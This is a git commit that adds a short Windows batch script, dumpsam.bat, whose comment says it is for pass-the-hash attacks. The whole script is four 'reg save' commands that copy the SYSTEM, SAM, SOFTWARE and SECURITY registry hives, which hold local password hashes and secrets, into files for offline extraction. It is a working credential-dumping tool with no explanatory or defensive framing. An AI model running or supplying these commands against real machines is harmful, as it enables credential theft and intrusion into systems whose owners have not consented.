41321bead9c5f6b2a7f7c8e11108d284359379b1
Carlos Cabrera <104575376+Kuru369@users.noreply.github.com>
2022-04-28 10:28:13 -0400

    Create dumpsam.bat

---
+++ dumpsam.bat
@@ -0,0 +1,5 @@
+::Dump the SYSTEM, SAM, SOFTWARE & SECURITY from a windows machine for PTH::
+reg save hklm\system system
+reg save hklm\sam sam
+reg save hklm\software software
+reg save hklm\security security
